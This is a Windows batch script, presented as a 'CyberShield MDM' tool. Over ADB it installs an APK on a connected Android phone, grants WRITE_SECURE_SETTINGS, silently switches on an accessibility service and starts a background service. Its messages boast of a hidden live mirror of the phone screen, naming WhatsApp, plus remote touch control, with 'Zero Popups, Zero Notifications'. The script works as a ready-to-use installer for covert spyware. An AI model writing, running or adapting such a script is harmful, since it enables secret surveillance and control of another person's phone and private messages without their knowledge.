@echo off
title CyberShield MDM - Enable Silent Remote Screen on Connected Mobile
color 0A
echo =========================================================================
echo   CyberShield MDM - Activate Zero-Notification Silent Remote Screen
echo =========================================================================
echo.
echo This tool activates the Silent Physical Screen Streaming service
echo on your connected Android phone (Zero Popups, Zero Notifications).
echo.
cd /d "%~dp0"

:: 1. Auto-detect ADB
set "ADB_EXE="
if exist "%~dp0adb.exe" (
    set "ADB_EXE=%~dp0adb.exe"
) else if exist "%~dp0publish\Mobile\adb.exe" (
    set "ADB_EXE=%~dp0publish\Mobile\adb.exe"
) else (
    where adb >nul 2>&1
    if %errorlevel% equ 0 (
        set "ADB_EXE=adb"
    ) else if exist "%LOCALAPPDATA%\Android\Sdk\platform-tools\adb.exe" (
        set "ADB_EXE=%LOCALAPPDATA%\Android\Sdk\platform-tools\adb.exe"
    )
)

if "%ADB_EXE%"=="" (
    echo [ERROR] adb.exe not found!
    echo Please make sure adb.exe is in the same folder as this script.
    echo.
    pause
    exit /b 1
)

echo [1/3] Waiting for connected Android phone via USB...
echo       - Connect phone with USB cable.
echo       - Make sure USB Debugging is ON.
echo.

"%ADB_EXE%" wait-for-device
echo [Device Found] Connected Device:
"%ADB_EXE%" devices
echo.

echo [2/3] Updating CyberShield MDM Client APK...
if exist "%~dp0CyberShield-MDM-Client.apk" (
    echo   Installing updated CyberShield-MDM-Client.apk...
    "%ADB_EXE%" install -r "%~dp0CyberShield-MDM-Client.apk"
) else if exist "%~dp0publish\Mobile\CyberShield-MDM-Client.apk" (
    echo   Installing updated publish\Mobile\CyberShield-MDM-Client.apk...
    "%ADB_EXE%" install -r "%~dp0publish\Mobile\CyberShield-MDM-Client.apk"
)

echo.
echo [3/3] Auto-Granting Silent Physical Screen & Touch Control Permissions...
"%ADB_EXE%" shell pm grant com.cybershield.mdm android.permission.WRITE_SECURE_SETTINGS >nul 2>&1
"%ADB_EXE%" shell settings put secure enabled_accessibility_services com.cybershield.mdm/com.cybershield.mdm.MdmAccessibilityService >nul 2>&1
"%ADB_EXE%" shell settings put secure accessibility_enabled 1 >nul 2>&1

echo   * Permission WRITE_SECURE_SETTINGS: GRANTED!
echo   * Service MdmAccessibilityService:  ACTIVATED SILENTLY!
echo   * Touch & Gesture Control:         ENABLED!

echo.
echo Refreshing CyberShield MDM Service on Phone...
"%ADB_EXE%" shell am force-stop com.cybershield.mdm >nul 2>&1
timeout /t 1 /nobreak >nul
"%ADB_EXE%" shell am start-foreground-service -n com.cybershield.mdm/.CyberShieldService >nul 2>&1

echo.
echo =========================================================================
echo  [SUCCESS] Silent Remote Physical Screen is now 100%% ACTIVE on your phone!
echo   * Real physical screen mirror (WhatsApp, Home, Settings) is active.
echo   * Zero user prompts, Zero notifications.
echo   * Open your MDM Web Portal -> Click Manage on Mobile -> Click Mobile Screen!
echo =========================================================================
echo.
pause
